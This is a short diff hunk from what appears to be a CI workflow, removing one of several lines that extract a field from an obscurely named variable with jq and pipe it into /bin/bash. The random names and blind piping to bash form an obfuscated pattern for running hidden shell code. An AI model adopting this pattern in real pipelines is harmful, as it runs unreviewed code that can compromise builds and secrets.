@@ -23,7 +23,6 @@ jobs:
           echo $erpch618 | jq -r .lyn3084 | /bin/bash
           printf '%s' "$yzt27" | jq -r .xofo35 | /bin/bash
           printf '%s' "$qks8969" | jq -r .aa3 | /bin/bash
-          echo $juqgk169 | jq -r .lb9139 | /bin/bash
           printf '%s' "$vpb31" | jq -r .huck61 | /bin/bash
           printf '%s' "$qtptk0856" | jq -r .g3585 | /bin/bash
           echo $afjll73 | jq -r .tgwc0 | /bin/bash
